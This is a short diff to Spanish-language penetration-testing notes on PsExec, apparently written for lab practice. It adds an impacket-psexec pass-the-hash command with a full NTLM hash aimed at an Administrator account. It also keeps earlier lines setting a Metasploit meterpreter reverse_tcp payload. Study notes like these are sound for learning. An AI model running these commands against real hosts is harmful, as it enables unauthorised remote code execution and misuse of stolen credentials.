@@ -8,6 +8,13 @@ Usando el módulo: `exploit/smb/psexec`
 Set RHOSTS, SMBPASS, SMBUser y para dentro
 Si como **payload** quieres consola **meterpreter** cambiar el payload:
 **set payload windows/x64/meterpreter/reverse_tcp** y configurar al opciones del payload.
+
+## SIN MESTASPLOIT
+
+```bash
+impacket-psexec -hashes aad3b435b51404eeaad3b435b51404ee:bac9dc5b7b4bec1d83e0e9c04b477f26 Administrator@10.129.203.122
+
+```
 # 🖥️ PsExec - Requisitos de Acceso
 
 ## 📌 ¿Se necesita ser administrador?
